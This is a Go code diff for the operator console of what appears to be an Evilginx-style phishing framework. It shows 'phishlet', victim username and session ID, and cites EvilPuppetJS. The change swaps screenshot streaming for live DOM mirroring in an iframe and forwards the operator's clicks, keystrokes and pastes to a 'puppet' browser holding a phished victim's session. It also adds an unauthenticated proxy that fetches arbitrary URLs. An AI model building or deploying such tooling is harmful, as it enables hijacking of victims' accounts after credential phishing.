@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"net/url"
 	"strconv"
 	"strings"
 	"time"
@@ -13,8 +14,8 @@ import (
 )
 
 // PuppetServer provides a web-based interface for remotely controlling puppet browser instances.
-// It serves an HTML/JS UI and handles WebSocket connections for real-time screenshot streaming
-// and input forwarding.
+// It serves an HTML/JS UI that mirrors the puppet browser's DOM in real-time, handles WebSocket
+// connections for DOM-streaming and input forwarding, and proxies resources through a cache.
 type PuppetServer struct {
 	pm         *PuppetManager
 	port       int
@@ -24,9 +25,9 @@ type PuppetServer struct {
 
 var wsUpgrader = websocket.Upgrader{
 	ReadBufferSize:  4096,
-	WriteBufferSize: 131072,
+	WriteBufferSize: 262144,
 	CheckOrigin: func(r *http.Request) bool {
-		return true // Allow all origins since this is on a controlled server
+		return true
 	},
 }
 
@@ -42,6 +43,7 @@ func NewPuppetServer(pm *PuppetManager, port int, password string) *PuppetServer
 func (ps *PuppetServer) Start() error {
 	mux := http.NewServeMux()
 	mux.HandleFunc("/puppet/ws/", ps.handleWebSocket)
+	mux.HandleFunc("/puppet/res/", ps.handleResource)
 	mux.HandleFunc("/puppet/", ps.handleHTTP)
 
 	ps.httpServer = &http.Server{
@@ -83,12 +85,10 @@ func (ps *PuppetServer) handleHTTP(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Parse puppet ID from URL path: /puppet/<id>
 	pathPart := strings.TrimPrefix(r.URL.Path, "/puppet/")
 	pathPart = strings.TrimSuffix(pathPart, "/")
 
 	if pathPart == "" {
-		// List page
 		ps.serveListPage(w, r)
 		return
 	}
@@ -108,13 +108,55 @@ func (ps *PuppetServer) handleHTTP(w http.ResponseWriter, r *http.Request) {
 	ps.serveControlPage(w, r, puppetId)
 }
 
+// handleResource serves cached resources through the proxy.
+// URL format: /puppet/res/{puppetId}/?url={encoded_original_url}
+func (ps *PuppetServer) handleResource(w http.ResponseWriter, r *http.Request) {
+	pathPart := strings.TrimPrefix(r.URL.Path, "/puppet/res/")
+	pathPart = strings.TrimSuffix(pathPart, "/")
+
+	puppetId, err := strconv.Atoi(pathPart)
+	if err != nil {
+		http.Error(w, "Invalid puppet ID", http.StatusBadRequest)
+		return
+	}
+
+	resourceURL := r.URL.Query().Get("url")
+	if resourceURL == "" {
+		http.Error(w, "Missing url parameter", http.StatusBadRequest)
+		return
+	}
+
+	// URL-decode the resource URL
+	resourceURL, err = url.QueryUnescape(resourceURL)
+	if err != nil {
+		http.Error(w, "Invalid url parameter", http.StatusBadRequest)
+		return
+	}
+
+	rc, rcErr := ps.pm.GetResourceCache(puppetId)
+	if rcErr != nil {
+		http.Error(w, "Puppet not found", http.StatusNotFound)
+		return
+	}
+
+	res, fetchErr := rc.FetchAndCache(resourceURL)
+	if fetchErr != nil {
+		http.Error(w, "Resource not available", http.StatusNotFound)
+		return
+	}
+
+	w.Header().Set("Content-Type", res.MimeType)
+	w.Header().Set("Cache-Control", "public, max-age=3600")
+	w.Header().Set("Access-Control-Allow-Origin", "*")
+	w.Write(res.Data)
+}
+
 func (ps *PuppetServer) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	if !ps.authenticate(r) {
 		http.Error(w, "Unauthorized", http.StatusUnauthorized)
 		return
 	}
 
-	// Parse puppet ID: /puppet/ws/<id>
 	pathPart := strings.TrimPrefix(r.URL.Path, "/puppet/ws/")
 	pathPart = strings.TrimSuffix(pathPart, "/")
 
@@ -152,8 +194,15 @@ func (ps *PuppetServer) handleWebSocket(w http.ResponseWriter, r *http.Request) 
 	statusJSON, _ := json.Marshal(statusMsg)
 	conn.WriteMessage(websocket.TextMessage, statusJSON)
 
-	// Start a goroutine to stream screenshots
-	screenCh, err := ps.pm.GetScreenChan(puppetId)
+	// Send the last full DOM state immediately so the client renders the current page
+	lastUpdate := ps.pm.GetLastUpdate(puppetId)
+	if lastUpdate != nil {
+		updateJSON, _ := json.Marshal(lastUpdate)
+		conn.WriteMessage(websocket.TextMessage, updateJSON)
+	}
+
+	// Get the content channel for live streaming
+	contentCh, err := ps.pm.GetContentChan(puppetId)
 	if err != nil {
 		log.Error("puppet ws: %v", err)
 		return
@@ -161,37 +210,26 @@ func (ps *PuppetServer) handleWebSocket(w http.ResponseWriter, r *http.Request) 
 
 	stopCh := make(chan struct{})
 
-	// Screenshot streaming goroutine
+	// DOM streaming goroutine
 	go func() {
-		urlTicker := time.NewTicker(2 * time.Second)
-		defer urlTicker.Stop()
-
 		for {
 			select {
 			case <-stopCh:
 				return
-			case frame, ok := <-screenCh:
+			case update, ok := <-contentCh:
 				if !ok {
 					return
 				}
-				// Set write deadline so a stalled client doesn't freeze the server
+				updateJSON, _ := json.Marshal(update)
 				conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
-				if err := conn.WriteMessage(websocket.BinaryMessage, frame); err != nil {
+				if err := conn.WriteMessage(websocket.TextMessage, updateJSON); err != nil {
 					return
-				}
-			case <-urlTicker.C:
-				// Periodically send the current URL
-				currentURL, err := ps.pm.GetCurrentURL(puppetId)
-				if err == nil && currentURL != "" {
-					urlMsg := map[string]string{"type": "url", "url": currentURL}
-					urlJSON, _ := json.Marshal(urlMsg)
-					conn.WriteMessage(websocket.TextMessage, urlJSON)
 				}
 			}
 		}
 	}()
 
-	// Set read deadline — refreshed on every message (keepalive pings extend it)
+	// Set read deadline — refreshed on every message
 	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
 
 	// Read input events from the client
@@ -201,7 +239,6 @@ func (ps *PuppetServer) handleWebSocket(w http.ResponseWriter, r *http.Request) 
 			break
 		}
 
-		// Refresh deadline on every message received
 		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
 
 		var pi PuppetInput
@@ -209,7 +246,6 @@ func (ps *PuppetServer) handleWebSocket(w http.ResponseWriter, r *http.Request) 
 			continue
 		}
 
-		// Ignore keepalive pings
 		if pi.Type == "ping" {
 			continue
 		}
@@ -300,11 +336,13 @@ func (ps *PuppetServer) serveControlPage(w http.ResponseWriter, r *http.Request,
 	}
 
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
-	fmt.Fprintf(w, puppetControlHTML, puppetId, puppet.SessionId, puppet.Username, puppet.Phishlet, puppetId, key, puppet.viewportW, puppet.viewportH)
+	fmt.Fprintf(w, puppetControlHTML, puppetId, puppet.SessionId, puppet.Username, puppet.Phishlet, puppetId, key)
 }
 
-// puppetControlHTML is the embedded HTML/JS/CSS for the remote browser control interface.
-// Format args: puppetId, sessionId, username, phishlet, puppetId (ws), key, viewportW, viewportH
+// puppetControlHTML is the DOM-streaming remote control interface.
+// It renders the target page as real HTML in an iframe, captures user interactions,
+// and forwards them to the puppet browser via WebSocket — mirroring EvilPuppetJS's approach.
+// Format args: puppetId, sessionId, username, phishlet, puppetId (ws), key
 var puppetControlHTML = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -321,8 +359,6 @@ body {
     display: flex;
     flex-direction: column;
     height: 100vh;
-    user-select: none;
-    -webkit-user-select: none;
 }
 .toolbar {
     display: flex;
@@ -367,26 +403,11 @@ body {
     padding: 0 8px;
 }
 .puppet-info .label { color: #58a6ff; font-weight: 600; }
-.viewport-container {
-    flex: 1;
-    overflow: hidden;
-    display: flex;
-    justify-content: center;
-    align-items: flex-start;
-    background: #010409;
-    position: relative;
-    line-height: 0;
-    font-size: 0;
-}
 #viewport {
-    cursor: crosshair;
-    max-width: 100%%;
-    max-height: 100%%;
-    display: block;
-    image-rendering: -webkit-optimize-contrast;
-    margin: 0;
-    padding: 0;
-    vertical-align: top;
+    flex: 1;
+    border: none;
+    width: 100%%;
+    background: #fff;
 }
 .statusbar {
     display: flex;
@@ -412,14 +433,14 @@ body {
 .status-dot.connecting { background: #d29922; box-shadow: 0 0 4px #d2992288; animation: pulse 1.5s infinite; }
 @keyframes pulse { 0%%,100%% { opacity: 1; } 50%% { opacity: 0.4; } }
 .loading-overlay {
-    position: absolute;
+    position: fixed;
     top: 0; left: 0; right: 0; bottom: 0;
     display: flex;
     flex-direction: column;
     justify-content: center;
     align-items: center;
     background: #0d1117ee;
-    z-index: 5;
+    z-index: 100;
     transition: opacity 0.3s;
 }
 .loading-overlay.hidden { opacity: 0; pointer-events: none; }
@@ -448,52 +469,279 @@ body {
     </div>
 </div>
 
-<div class="viewport-container">
-    <div class="loading-overlay" id="loading">
-        <div class="loading-spinner"></div>
-        <div class="loading-text">Connecting to puppet browser...</div>
-    </div>
-    <img id="viewport" draggable="false">
+<iframe id="viewport"></iframe>
+
+<div class="loading-overlay" id="loading">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">Connecting to puppet browser...</div>
 </div>
 
 <div class="statusbar">
     <span id="status"><span class="status-dot connecting"></span>Connecting...</span>
-    <span id="coords"></span>
-    <span id="fps">-- fps</span>
+    <span id="updates">-- updates</span>
 </div>
 
 <script>
 (function() {
-    const PUPPET_ID = %d;
-    const WS_KEY = '%s';
-    const VIEWPORT_W = %d;
-    const VIEWPORT_H = %d;
+    var PUPPET_ID = %d;
+    var WS_KEY = '%s';
 
-    const viewport = document.getElementById('viewport');
-    const urlBar = document.getElementById('url-bar');
-    const statusEl = document.getElementById('status');
-    const fpsEl = document.getElementById('fps');
-    const coordsEl = document.getElementById('coords');
-    const loadingEl = document.getElementById('loading');
+    var urlBar = document.getElementById('url-bar');
+    var statusEl = document.getElementById('status');
+    var updatesEl = document.getElementById('updates');
+    var loadingEl = document.getElementById('loading');
+    var viewport = document.getElementById('viewport');
 
-    let ws = null;
-    let frameCount = 0;
-    let lastFpsTime = Date.now();
-    let lastMoveTime = 0;
-    let reconnectDelay = 1000;
-    let hasReceivedFrame = false;
+    var ws = null;
+    var updateCount = 0;
+    var reconnectDelay = 1000;
+    var initialized = false;
+    var iframeDoc = null;
 
+    // Initialize the iframe document
+    viewport.srcdoc = '<html><head></head><body></body></html>';
+    viewport.onload = function() {
+        iframeDoc = viewport.contentDocument || viewport.contentWindow.document;
+        setupIframeEvents();
+    };
+
+    // ---- CSS Path computation (matches EvilPuppetJS) ----
+    function getCssPath(el) {
+        if (!(el instanceof Element)) return '';
+        var path = [];
+        while (el.nodeType === Node.ELEMENT_NODE) {
+            var selector = el.nodeName.toLowerCase();
+            if (el.id) {
+                selector += '#' + el.id;
+                path.unshift(selector);
+                break;
+            } else {
+                var sib = el, nth = 1;
+                while (sib = sib.previousElementSibling) {
+                    if (sib.nodeName.toLowerCase() == selector) nth++;
+                }
+                if (nth != 1) selector += ':nth-of-type(' + nth + ')';
+            }
+            path.unshift(selector);
+            el = el.parentNode;
+        }
+        return path.join(' > ');
+    }
+
+    // ---- DOM morphing (updates real DOM to match new HTML without full replacement) ----
+    function morphAttributes(from, to) {
+        for (var i = from.attributes.length - 1; i >= 0; i--) {
+            var attr = from.attributes[i];
+            if (!to.hasAttribute(attr.name)) {
+                from.removeAttribute(attr.name);
+            }
+        }
+        for (var i = 0; i < to.attributes.length; i++) {
+            var attr = to.attributes[i];
+            if (from.getAttribute(attr.name) !== attr.value) {
+                from.setAttribute(attr.name, attr.value);
+            }
+        }
+    }
+
+    function morphChildren(fromNode, toNode) {
+        var fromChildren = Array.from(fromNode.childNodes);
+        var toChildren = Array.from(toNode.childNodes);
+        var maxLen = Math.max(fromChildren.length, toChildren.length);
+
+        for (var i = 0; i < maxLen; i++) {
+            var f = i < fromChildren.length ? fromChildren[i] : null;
+            var t = i < toChildren.length ? toChildren[i] : null;
+
+            if (!t) {
+                fromNode.removeChild(f);
+                continue;
+            }
+            if (!f) {
+                fromNode.appendChild(fromNode.ownerDocument.importNode(t, true));
+                continue;
+            }
+            if (f.nodeType !== t.nodeType || f.nodeName !== t.nodeName) {
+                fromNode.replaceChild(fromNode.ownerDocument.importNode(t, true), f);
+                continue;
+            }
+            if (f.nodeType === 3) {
+                if (f.textContent !== t.textContent) {
+                    f.textContent = t.textContent;
+                }
+                continue;
+            }
+            if (f.nodeType === 1) {
+                // Skip actively focused input/textarea to preserve user typing
+                if (iframeDoc && f === iframeDoc.activeElement) {
+                    var tag = f.tagName;
+                    if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') {
+                        continue;
+                    }
+                }
+                morphAttributes(f, t);
+                morphChildren(f, t);
+            }
+        }
+    }
+
+    // ---- Apply DOM updates from server ----
+    function applyDOMUpdate(update) {
+        if (!iframeDoc) return;
+
+        if (update.head) {
+            var doc = new DOMParser().parseFromString('<html>' + update.head + '<body></body></html>', 'text/html');
+            if (!initialized) {
+                iframeDoc.head.innerHTML = '';
+                Array.from(doc.head.childNodes).forEach(function(node) {
+                    iframeDoc.head.appendChild(iframeDoc.importNode(node, true));
+                });
+            } else {
+                morphChildren(iframeDoc.head, doc.head);
+            }
+        }
+
+        if (update.body) {
+            var doc = new DOMParser().parseFromString('<html><head></head>' + update.body + '</html>', 'text/html');
+            if (!initialized) {
+                iframeDoc.body.innerHTML = '';
+                Array.from(doc.body.childNodes).forEach(function(node) {
+                    iframeDoc.body.appendChild(iframeDoc.importNode(node, true));
+                });
+                // Copy body attributes
+                for (var i = 0; i < doc.body.attributes.length; i++) {
+                    var attr = doc.body.attributes[i];
+                    iframeDoc.body.setAttribute(attr.name, attr.value);
+                }
+            } else {
+                morphAttributes(iframeDoc.body, doc.body);
+                morphChildren(iframeDoc.body, doc.body);
+            }
+        }
+
+        if (update.head || update.body) {
+            initialized = true;
+        }
+
+        if (update.url && document.activeElement !== urlBar) {
+            urlBar.value = update.url;
+        }
+    }
+
+    function applyInputChange(update) {
+        if (!iframeDoc) return;
+        try {
+            var el = iframeDoc.querySelector(update.cssPath);
+            if (el && el !== iframeDoc.activeElement) {
+                el.value = update.value;
+                if (update.selectionStart !== undefined) {
+                    el.selectionStart = update.selectionStart;
+                    el.selectionEnd = update.selectionEnd;
+                }
+            }
+        } catch(e) {}
+    }
+
+    // ---- Event handlers on the iframe ----
+    function setupIframeEvents() {
+        if (!iframeDoc) return;
+
+        // Click handler
+        iframeDoc.addEventListener('click', function(e) {
+            e.preventDefault();
+            var cssPath = getCssPath(e.target);
+            if (cssPath) {
+                sendInput({type: 'click', cssPath: cssPath});
+            }
+        });
+
+        // Prevent default on mousedown to stop text selection interfering
+        iframeDoc.addEventListener('mousedown', function(e) {
+            // Allow on inputs/textareas for cursor positioning
+            var tag = e.target.tagName;
+            if (tag !== 'INPUT' && tag !== 'TEXTAREA' && tag !== 'SELECT') {
+                e.preventDefault();
+            }
+        });
+
+        // Keyboard handler
+        iframeDoc.addEventListener('keydown', function(e) {
+            // Let Ctrl+V through for paste handler
+            if ((e.ctrlKey || e.metaKey) && e.key === 'v') return;
+
+            // Skip pure modifier keys — they are captured as modifiers on other events
+            if (e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
+
+            e.preventDefault();
+
+            var keyName = e.key;
+
+            // Handle Ctrl combos
+            if (e.ctrlKey && e.key === 'Backspace') keyName = 'CtrlBackspace';
+            else if (e.ctrlKey && e.key === 'z') keyName = 'CtrlZ';
+            else if (e.ctrlKey && e.key === 'y') keyName = 'CtrlY';
+
+            var msg = {type: 'keypress', key: keyName, code: e.code};
+
+            // For special keys (non-printable), include modifier flags so Shift+Tab etc. work
+            if (e.key.length > 1) {
+                var mod = 0;
+                if (e.altKey) mod |= 1;
+                if (e.ctrlKey) mod |= 2;
+                if (e.metaKey) mod |= 4;
+                if (e.shiftKey) mod |= 8;
+                if (mod) msg.modifiers = mod;
+            }
+
+            sendInput(msg);
+        });
+
+        // Paste handler
+        iframeDoc.addEventListener('paste', function(e) {
+            var text = (e.clipboardData || window.clipboardData).getData('text');
+            if (text) {
+                sendInput({type: 'type', text: text});
+            }
+            e.preventDefault();
+        });
+
+        // Selection change handler (for cursor positioning in inputs)
+        iframeDoc.addEventListener('selectionchange', function() {
+            var el = iframeDoc.activeElement;
+            if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA')) {
+                var cssPath = getCssPath(el);
+                if (cssPath) {
+                    sendInput({
+                        type: 'selectionchange',
+                        cssPath: cssPath,
+                        selectionStart: el.selectionStart || 0,
+                        selectionEnd: el.selectionEnd || 0
+                    });
+                }
+            }
+        });
+
+        // Prevent form submissions
+        iframeDoc.addEventListener('submit', function(e) {
+            e.preventDefault();
+        });
+
+        // Context menu
+        iframeDoc.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    }
+
+    // ---- WebSocket connection ----
     function connect() {
-        const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const wsUrl = proto + '//' + location.host + '/puppet/ws/' + PUPPET_ID + '?key=' + WS_KEY;
+        var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+        var wsUrl = proto + '//' + location.host + '/puppet/ws/' + PUPPET_ID + '?key=' + WS_KEY;
 
         ws = new WebSocket(wsUrl);
-        ws.binaryType = 'blob';
 
         ws.onopen = function() {
             setStatus('connected', 'Connected');
             reconnectDelay = 1000;
-            // Send keepalive pings to prevent idle timeout
             if (window._pingInterval) clearInterval(window._pingInterval);
             window._pingInterval = setInterval(function() {
                 if (ws && ws.readyState === WebSocket.OPEN) {
@@ -515,39 +763,29 @@ body {
         };
 
         ws.onmessage = function(event) {
-            if (event.data instanceof Blob) {
-                // Binary message = screenshot frame (JPEG)
-                if (!hasReceivedFrame) {
-                    hasReceivedFrame = true;
-                    loadingEl.classList.add('hidden');
-                }
+            try {
+                var msg = JSON.parse(event.data);
 
-                const url = URL.createObjectURL(event.data);
-                const oldUrl = viewport.src;
-                viewport.src = url;
-                if (oldUrl && oldUrl.startsWith('blob:')) URL.revokeObjectURL(oldUrl);
-
-                frameCount++;
-                const now = Date.now();
-                if (now - lastFpsTime >= 1000) {
-                    fpsEl.textContent = frameCount + ' fps';
-                    frameCount = 0;
-                    lastFpsTime = now;
-                }
-            } else {
-                // Text message = JSON control
-                try {
-                    const msg = JSON.parse(event.data);
-                    if (msg.type === 'url') {
-                        if (document.activeElement !== urlBar) {
-                            urlBar.value = msg.url;
-                        }
-                    } else if (msg.type === 'status') {
-                        // Initial status
-                    } else if (msg.type === 'error') {
-                        console.error('Puppet error:', msg.message);
+                if (msg.type === 'domupdate') {
+                    if (!initialized) {
+                        loadingEl.classList.add('hidden');
                     }
-                } catch(e) {}
+                    applyDOMUpdate(msg);
+                    updateCount++;
+                    updatesEl.textContent = updateCount + ' updates';
+                } else if (msg.type === 'inputchange') {
+                    applyInputChange(msg);
+                } else if (msg.type === 'url') {
+                    if (document.activeElement !== urlBar) {
+                        urlBar.value = msg.url;
+                    }
+                } else if (msg.type === 'status') {
+                    // Initial status message
+                } else if (msg.type === 'error') {
+                    console.error('Puppet error:', msg.message);
+                }
+            } catch(e) {
+                console.error('Failed to parse message:', e);
             }
         };
     }
@@ -562,142 +800,7 @@ body {
         }
     }
 
-    function getScaledCoords(e) {
-        const rect = viewport.getBoundingClientRect();
-        if (rect.width === 0 || rect.height === 0) return null;
-
-        // With max-width/max-height (no object-fit), the <img> element
-        // sizes itself to exactly match the rendered content area.
-        // getBoundingClientRect() IS the content area — no letterbox offset needed.
-        var relX = e.clientX - rect.left;
-        var relY = e.clientY - rect.top;
-
-        // Clamp to the image bounds
-        if (relX < 0 || relX > rect.width || relY < 0 || relY > rect.height) return null;
-
-        return {
-            x: Math.round((relX / rect.width) * VIEWPORT_W),
-            y: Math.round((relY / rect.height) * VIEWPORT_H)
-        };
-    }
-
-    function getModifiers(e) {
-        let mod = 0;
-        if (e.altKey) mod |= 1;
-        if (e.ctrlKey) mod |= 2;
-        if (e.metaKey) mod |= 4;
-        if (e.shiftKey) mod |= 8;
-        return mod;
-    }
-
-    function buttonName(b) {
-        switch(b) {
-            case 0: return 'left';
-            case 1: return 'middle';
-            case 2: return 'right';
-            default: return 'left';
-        }
-    }
-
-    // Mouse events on the viewport
-    // Only use 'click' for left button to avoid double-firing (mousedown+mouseup+click = 2 clicks).
-    // Right/middle clicks still use mousedown/mouseup since 'click' doesn't fire for them.
-    viewport.addEventListener('mousedown', function(e) {
-        if (e.button === 0) { e.preventDefault(); return; } // Left click handled by 'click' event
-        const c = getScaledCoords(e);
-        if (!c) return;
-        sendInput({type: 'mousedown', x: c.x, y: c.y, button: buttonName(e.button), modifiers: getModifiers(e)});
-        e.preventDefault();
-    });
-
-    viewport.addEventListener('mouseup', function(e) {
-        if (e.button === 0) { e.preventDefault(); return; }
-        const c = getScaledCoords(e);
-        if (!c) return;
-        sendInput({type: 'mouseup', x: c.x, y: c.y, button: buttonName(e.button), modifiers: getModifiers(e)});
-        e.preventDefault();
-    });
-
-    viewport.addEventListener('click', function(e) {
-        const c = getScaledCoords(e);
-        if (!c) return;
-        // Send a mousemove first to trigger hover states (required by many modern login pages)
-        sendInput({type: 'mousemove', x: c.x, y: c.y});
-        // Small delay then click — lets the hover state register before the click
-        setTimeout(function() {
-            sendInput({type: 'click', x: c.x, y: c.y, button: buttonName(e.button), modifiers: getModifiers(e)});
-        }, 50);
-        e.preventDefault();
-    });
-
-    viewport.addEventListener('dblclick', function(e) {
-        const c = getScaledCoords(e);
-        if (!c) return;
-        sendInput({type: 'click', x: c.x, y: c.y, button: 'left', modifiers: getModifiers(e)});
-        setTimeout(function() {
-            sendInput({type: 'click', x: c.x, y: c.y, button: 'left', modifiers: getModifiers(e)});
-        }, 80);
-        e.preventDefault();
-    });
-
-    viewport.addEventListener('mousemove', function(e) {
-        const now = Date.now();
-        if (now - lastMoveTime < 50) return; // Throttle to ~20/sec
-        lastMoveTime = now;
-        const c = getScaledCoords(e);
-        if (!c) return;
-        coordsEl.textContent = c.x + ', ' + c.y;
-        sendInput({type: 'mousemove', x: c.x, y: c.y});
-    });
-
-    viewport.addEventListener('wheel', function(e) {
-        const c = getScaledCoords(e);
-        if (!c) return;
-        sendInput({type: 'scroll', x: c.x, y: c.y, deltaX: e.deltaX, deltaY: e.deltaY});
-        e.preventDefault();
-    }, {passive: false});
-
-    viewport.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-    });
-
-    // Paste support — intercept Ctrl+V / Cmd+V and send clipboard text
-    document.addEventListener('paste', function(e) {
-        if (document.activeElement === urlBar) return;
-        var text = (e.clipboardData || window.clipboardData).getData('text');
-        if (text) {
-            sendInput({type: 'type', text: text});
-        }
-        e.preventDefault();
-    });
-
-    // Keyboard events (only when url bar is not focused)
-    document.addEventListener('keydown', function(e) {
-        if (document.activeElement === urlBar) return;
-
-        // Let paste event handle Ctrl+V / Cmd+V
-        if ((e.ctrlKey || e.metaKey) && e.key === 'v') return;
-
-        if (e.key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
-            // Printable character
-            sendInput({type: 'type', text: e.key});
-        } else {
-            // Special key
-            sendInput({type: 'keydown', key: e.key, code: e.code, modifiers: getModifiers(e)});
-        }
-        e.preventDefault();
-    });
-
-    document.addEventListener('keyup', function(e) {
-        if (document.activeElement === urlBar) return;
-        if ((e.ctrlKey || e.metaKey) && e.key === 'v') return;
-        if (e.key.length > 1 || e.ctrlKey || e.metaKey || e.altKey) {
-            sendInput({type: 'keyup', key: e.key, code: e.code, modifiers: getModifiers(e)});
-        }
-        e.preventDefault();
-    });
-
-    // Navigation buttons
+    // ---- Toolbar buttons ----
     document.getElementById('btn-back').addEventListener('click', function() {
         sendInput({type: 'back'});
     });
@@ -708,7 +811,6 @@ body {
         sendInput({type: 'refresh'});
     });
 
-    // URL bar navigation
     urlBar.addEventListener('keydown', function(e) {
         if (e.key === 'Enter') {
             sendInput({type: 'navigate', url: urlBar.value});
